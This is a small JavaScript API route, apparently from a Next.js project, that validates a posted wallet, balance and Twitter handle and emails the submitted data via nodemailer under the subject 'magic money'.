import { transporter, mailOptions } from '../../../configs/nodemailer';

export async function sendEmail(req, res) {
    if (req.method === 'POST') {
        const data = req.body
        if (!data.wallet || !data.balance.toString() || !data.twitter) {
            return res.status(400).json({ message: 'campos necesarios no encontrados' })
        }
        const text = JSON.stringify(data)

        try {
            await transporter.sendMail({
                ...mailOptions,
                subject: 'magic money ',
                text,
            })


            res.status(200).json({ success: true })
        } catch (err) {
            console.log(err)
            return res.status(400).json({ message: err })
        }

    }

    return res.status(400).json({ message: 'peticion incorrecta' })
}

